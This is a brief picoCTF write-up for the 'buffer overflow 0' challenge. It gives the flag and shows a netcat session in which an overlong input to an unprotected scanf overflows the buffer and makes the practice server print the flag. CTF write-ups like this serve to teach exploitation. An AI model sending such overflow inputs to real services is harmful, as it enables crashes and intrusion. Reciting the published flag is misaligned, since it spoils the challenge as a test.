# buffer overflow 0

**Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}`

How you approached the challenge:

- step 1
Looking at the name and hints it made obvious that the answer was something related to overloading the input.

So I just held down a key and entered 2 strings cause the .c file had the input as %s %s
```bash
earthwarrior@LAPTOP-VLDN28C5:~$ nc saturn.picoctf.net 53208 
Input: wqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee 
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

What you learned through solving this challenge:

1. You can overload the input of a unprotected scanf to print other items in the stack


